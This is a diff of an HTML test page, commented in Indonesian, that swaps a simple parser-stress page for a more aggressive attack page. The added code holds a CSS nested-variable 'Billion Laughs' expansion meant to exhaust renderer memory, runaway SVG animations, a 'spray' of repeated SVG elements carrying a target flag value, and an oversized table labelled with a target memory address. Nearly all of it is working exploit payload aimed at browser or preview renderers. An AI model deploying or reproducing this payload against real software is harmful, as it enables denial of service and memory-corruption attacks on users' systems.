@@ -2,23 +2,54 @@
 <html>
 <head>
 <style>
-    /* Mencoba memicu rekursi atau overflow pada parser CSS */
+    /* Teknik 1: Nested Variable Expansion (Billion Laughs Attack versi CSS) */
+    /* Ini memaksa parser mengalokasikan memori masif saat merender gaya */
     :root {
-        --prop: var(--prop); /* Circular reference */
-        content: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; 
+        --a: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+        --b: var(--a) var(--a) var(--a) var(--a) var(--a) var(--a) var(--a);
+        --c: var(--b) var(--b) var(--b) var(--b) var(--b) var(--b) var(--b);
+        --d: var(--c) var(--c) var(--c) var(--c) var(--c) var(--c) var(--c);
+        --e: var(--d) var(--d) var(--d) var(--d) var(--d) var(--d) var(--d);
+        --f: var(--e) var(--e) var(--e) var(--e) var(--e) var(--e) var(--e);
     }
-    div {
-        /* String yang sangat panjang untuk menguji alokasi buffer */
-        background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxtYXJrZXI+PHBhdGggZD0iTTAgMGgxMHYxMEgwTTAgMHoiLz48L21hcmtlcj48L3N2Zz4=");
-        border: 1000vw solid blue;
-        transform: rotate(999999deg) scale(999999);
+    .asb-target {
+        /* Memasukkan pola Target Flag ke dalam properti yang akan dirender */
+        content: var(--f);
+        font-family: "0x08ad752109466b05"; /* Target Value Apple */
     }
 </style>
 </head>
 <body>
-    <div><div><div><div><div><div><div><div><div><div>
-    <div><div><div><div><div><div><div><div><div><div>
-    <h1>Pratinjau Pengujian ASB</h1>
-    <p>Jika pratinjau ini putih atau tertutup sendiri, periksa logs.</p>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+        <circle cx="250" cy="250" r="100">
+            <animate attributeName="r" from="0" to="1000" dur="0.0001s" repeatCount="indefinite" />
+            <animate attributeName="cx" from="0" to="1000" dur="0.0001s" repeatCount="indefinite" />
+            <animate attributeName="opacity" from="0" to="1" dur="0.0001s" repeatCount="indefinite" />
+        </circle>
+        
+        <defs>
+            <g id="target_flag">
+                <text y="20">0x08ad752109466b05</text>
+                <rect width="100" height="100" fill="red" />
+            </g>
+        </defs>
+        <g id="spray">
+            <use href="#target_flag" x="0" y="0" />
+            <use href="#target_flag" x="10" y="10" /><use href="#target_flag" x="20" y="20" />
+            <use href="#target_flag" x="30" y="30" /><use href="#target_flag" x="40" y="40" />
+        </g>
+    </svg>
+
+    <table style="table-layout: fixed; width: 1000000px;">
+        <tr>
+            <td colspan="100000" style="padding: 1000px;">
+                TARGET_ADDR: 0x0000000fffffc328
+            </td>
+        </tr>
+    </table>
+
+    <div class="asb-target">Memproses...</div>
+
 </body>
 </html>
